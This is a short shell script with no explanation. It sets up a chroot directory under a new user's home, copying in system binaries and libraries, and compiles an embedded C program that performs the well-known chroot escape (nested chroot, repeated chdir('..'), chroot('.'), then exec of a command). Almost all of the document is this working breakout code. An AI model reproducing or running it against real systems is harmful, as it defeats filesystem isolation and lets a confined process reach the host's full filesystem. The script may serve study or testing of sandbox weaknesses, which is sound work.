useradd userYY


MYROOT=/home/userYY
touch $MYROOT/myfile

cat <<EOF >$MYROOT/x.c
void main(int argc, char *argv[]) { 
      mkdir(".xx", 0755); 
      chroot(".xx"); 
      int i; 
      for (i = 0; i < 256; i++) { chdir(".."); } 
      chroot(".") ; 
      argv++; 
      execvp(argv[0], argv); 
}
EOF

(cd $MYROOT;gcc x.c)

cp -a /{bin,lib,lib64} $MYROOT
mkdir -p $MYROOT/usr/{bin,lib,lib64}
cp -p /usr/bin/* $MYROOT/usr/bin > /dev/null 2>&1
cp -p /lib64/* $MYROOT/usr/lib64 > /dev/null 2>&1
sudo chroot $MYROOT
